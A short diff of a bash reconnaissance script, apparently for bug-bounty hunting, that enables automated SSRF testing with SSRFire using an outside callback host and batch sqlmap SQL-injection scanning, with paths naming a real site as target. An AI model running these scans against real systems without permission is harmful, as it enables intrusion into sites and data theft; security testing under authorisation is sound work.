@@ -504,14 +504,18 @@ wait
 ########################################
 
 #################XSStrike####################################
+# Use Nuclei & Templates instead?
+# - Extendable
+# - Customizable
+# - Easy to control
+
+# Poor performance! Want better tool! :(
+
 # python xsstrike.py --seeds /var/www/h4x.fun/reports/finn.no/2020-05-27/recon-2020-05-27/wayback-data/waybackurls_clean.txt --file-log-level INFO --log-file output.txt --skip
 # TODO implement
 ########################################
 
 #########Check for Open Redirects or SSRFs#################
-# Check with gf & gf-patterns
-# TODO
-# Done in scan.sh - Use data here!
 
 # echo all domains
 # run against ssrf_OR_Identifier.sh
@@ -532,10 +536,8 @@ done
 print "SSRFire"
 mkdir -p $SAVEDIR/ssrf/ssrfire
 # SSRFire will automatically add test url to callback
-# TODO check data generated from ssrfire
-# Disabled for now
-# May want to use cleaned list
-#$TOOLDIR/SSRFire/ssrfire.sh -d "$domain" -s "http://ssrf.h4x.fun/x/pqCLV" >> "$SAVEDIR/ssrf/ssrfire/log.txt"
+# Simple requests using cleaned lists!
+$TOOLDIR/SSRFire/ssrfire.sh -d "$domain" -s "http://ssrf.h4x.fun/x/pqCLV" >> "$SAVEDIR/ssrf/ssrfire/log.txt"
 check "SSRFire"
 cp -r $TOOLDIR/SSRFire/output/$domain/* $SAVEDIR/ssrf/ssrfire
 check "Copy results ssrfire"
@@ -546,11 +548,8 @@ check "Remove results ssrfire in tooldir"
 # TODO add tamperscripts
 
 # TODO check data generated with sqlmap
-# Disabled for now
 print "Make dir and run sqlmap"
 mkdir -p $SAVEDIR/sqlmap/
-# Change to SQLI file!
-# TODO
 URLFILE="$SAVEDIR/$todate/targeted_lists/sqli.txt"
 python $TOOLDIR/sqlmap-dev/sqlmap.py --batch -m $URLFILE --random-agent -o --smart --results-file=$SAVEDIR/sqlmap/results.csv >> $SAVEDIR/sqlmap/sqlmap_log.txt
 check "Sqlmap"
